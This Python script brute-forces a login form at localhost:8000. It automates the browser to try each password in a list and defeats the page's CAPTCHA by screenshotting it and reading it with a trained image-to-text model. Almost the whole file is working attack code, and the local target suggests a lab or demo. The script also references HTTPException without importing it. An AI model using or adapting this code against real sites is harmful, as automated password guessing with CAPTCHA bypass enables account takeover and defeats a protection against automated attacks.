from lib.captcha_solver.inferenceModel import ImageToWordModel
from mltu.configs import BaseModelConfigs
import numpy as np
import cv2
import os
import time

project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
config_path = os.path.join(
    project_root,
    "lib", "captcha_solver", "Models", "02_captcha_to_text", "202504131954", "configs.yaml"
)

# Load configs from file
configs = BaseModelConfigs.load(config_path)

# Make the model_path absolute by resolving it relative to the config file's folder
model_path = os.path.dirname(config_path)

model = ImageToWordModel(model_path=model_path, char_list=configs.vocab)

def bruteforce_login(page, username, passwords):
    for password in passwords:
        page.goto("http://localhost:8000/")
        time.sleep(1)

        page.click("input[name='username']")
        page.type("input[name='username']", username, delay=100)
        time.sleep(0.5)

        page.click("input[name='password']")
        page.type("input[name='password']", password, delay=100)
        time.sleep(0.5)

        captcha_image = page.query_selector("img#captcha-image")
        if not captcha_image:
            print("Captcha image not found.")
            continue

        captcha_image_bytes = captcha_image.screenshot()
        captcha_text = solve_captcha(captcha_image_bytes)

        print("Solving captcha:", captcha_text)

        page.click("input[name='captcha']")
        page.type("input[name='captcha']", captcha_text, delay=100)
        time.sleep(0.5)
        
        with page.expect_response("**/login") as login_response_info:
            page.click("button[type='submit']")
        
        response = login_response_info.value
        
        result = response.json()
        
        if response.status == 200 and result.get("message") == "Login successful":
            print("✅ Login successful with password:", password)
            time.sleep(1)
            page.reload()
            time.sleep(5)
            return

        print(f"❌ Attempt failed with password: {password}")
        time.sleep(1)

    print("🚫 Bruteforce attack failed.")
    
def solve_captcha(image: bytes):
    np_image = np.frombuffer(image, np.uint8)

    # Decode as color (RGB-like), result: [H, W, 3]
    image = cv2.imdecode(np_image, cv2.IMREAD_COLOR)
    if image is None:
        raise HTTPException(status_code=400, detail="Invalid image format.")

    # Convert BGR (OpenCV default) → RGB
    image = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)

    prediction_text = model.predict(image)

    return prediction_text